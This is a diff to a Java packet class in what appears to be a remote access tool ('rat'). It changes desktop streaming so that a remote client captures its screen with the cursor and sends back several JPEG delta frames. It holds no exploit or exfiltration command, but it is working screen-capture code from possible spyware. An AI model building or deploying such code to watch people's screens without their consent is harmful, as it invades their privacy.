@@ -1,6 +1,8 @@
 package de.sogomn.rat.packet;
 
 import java.awt.image.BufferedImage;
+import java.util.ArrayList;
+import java.util.stream.Stream;
 
 import de.sogomn.engine.util.ImageUtils;
 import de.sogomn.rat.ActiveClient;
@@ -9,7 +11,7 @@ import de.sogomn.rat.util.FrameEncoder.IFrame;
 
 public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	
-	private IFrame frame;
+	private IFrame[] frames;
 	private int screenWidth, screenHeight;
 	
 	private byte deleteLastScreenshot;
@@ -18,6 +20,9 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	
 	private static final byte KEEP = 0;
 	private static final byte DELETE = 1;
+	
+	private static final byte INCOMING = 1;
+	private static final byte END = 0;
 	
 	public DesktopStreamPacket(final boolean delete) {
 		type = REQUEST;
@@ -35,12 +40,17 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void sendData(final ActiveClient client) {
-		final byte[] data = ImageUtils.toByteArray(frame.image, "JPG");
+		Stream.of(frames).forEach(frame -> {
+			final byte[] data = ImageUtils.toByteArray(frame.image, "JPG");
+			
+			client.writeByte(INCOMING);
+			client.writeShort((short)frame.x);
+			client.writeShort((short)frame.y);
+			client.writeInt(data.length);
+			client.write(data);
+		});
 		
-		client.writeInt(frame.x);
-		client.writeInt(frame.y);
-		client.writeInt(data.length);
-		client.write(data);
+		client.writeByte(END);
 		client.writeInt(screenWidth);
 		client.writeInt(screenHeight);
 	}
@@ -52,34 +62,40 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 	
 	@Override
 	protected void receiveData(final ActiveClient client) {
-		final int x = client.readInt();
-		final int y = client.readInt();
-		final int length = client.readInt();
-		final byte[] data = new byte[length];
+		final ArrayList<IFrame> framesList = new ArrayList<IFrame>();
 		
-		client.read(data);
+		while (client.readByte() == INCOMING) {
+			final int x = client.readShort();
+			final int y = client.readShort();
+			final int length = client.readInt();
+			final byte[] data = new byte[length];
+			
+			client.read(data);
+			
+			final BufferedImage image = ImageUtils.toImage(data);
+			final IFrame frame = new IFrame(x, y, image);
+			
+			framesList.add(frame);
+		}
 		
-		final BufferedImage image = ImageUtils.toImage(data);
-		
-		frame = new IFrame(x, y, image);
+		frames = framesList.stream().toArray(IFrame[]::new);
 		screenWidth = client.readInt();
 		screenHeight = client.readInt();
 	}
 	
 	@Override
 	protected void executeRequest(final ActiveClient client) {
-		final BufferedImage screenshot = ScreenshotPacket.takeScreenshot();
+		final BufferedImage screenshot = FrameEncoder.takeScreenshotWithCursor();
 		
 		if (deleteLastScreenshot == DELETE || lastScreenshot == null) {
-			frame = new IFrame(0, 0, screenshot);
-		} else if (deleteLastScreenshot == KEEP) {
-			frame = FrameEncoder.getIFrame(lastScreenshot, screenshot);
+			final IFrame frame = new IFrame(0, 0, screenshot);
 			
-			if (frame == null) {
-				frame = IFrame.EMPTY;
-			}
+			frames = new IFrame[1];
+			frames[0] = frame;
+		} else if (deleteLastScreenshot == KEEP) {
+			frames = FrameEncoder.getIFrames(lastScreenshot, screenshot);
 		} else {
-			frame = IFrame.EMPTY;
+			frames = new IFrame[0];
 		}
 		
 		type = DATA;
@@ -95,8 +111,8 @@ public final class DesktopStreamPacket extends AbstractPingPongPacket {
 		//...
 	}
 	
-	public IFrame getFrame() {
-		return frame;
+	public IFrame[] getFrames() {
+		return frames;
 	}
 	
 	public int getScreenWidth() {
